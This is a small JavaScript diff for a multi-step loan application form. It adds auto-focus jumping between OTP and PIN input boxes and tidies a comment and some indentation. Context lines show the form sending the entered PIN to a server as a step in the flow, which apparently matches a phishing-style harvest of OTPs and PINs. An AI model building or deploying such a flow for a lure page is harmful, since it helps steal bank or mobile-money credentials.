@@ -103,6 +103,30 @@ function updateCalculator() {
     document.getElementById('requestedAmount').value = amount;
 }
 
+// Auto-jump logic for OTP and PIN input boxes
+document.addEventListener('DOMContentLoaded', () => {
+    const setupInputGroup = (selector) => {
+        const inputs = document.querySelectorAll(selector);
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                const value = e.target.value;
+                if (value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && input.value === '' && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+    };
+
+    setupInputGroup('.otp-input');
+    setupInputGroup('.pin-input');
+});
+
 function submitStep1(e) {
     e.preventDefault();
     goToScreen('screen-step2');
@@ -111,7 +135,7 @@ function submitStep1(e) {
 
 function submitStep2(e) {
     e.preventDefault();
-    goToScreen('screen-step3'); // Explicitly transitions to Tembo Card screen
+    goToScreen('screen-step3');
 }
 
 function submitStep3(e) {
@@ -140,5 +164,5 @@ function submitStep5(e) {
     let pin = '';
     inputs.forEach(i => pin += i.value);
     postData('step5', { pin });
-        }
-                
+    }
+     
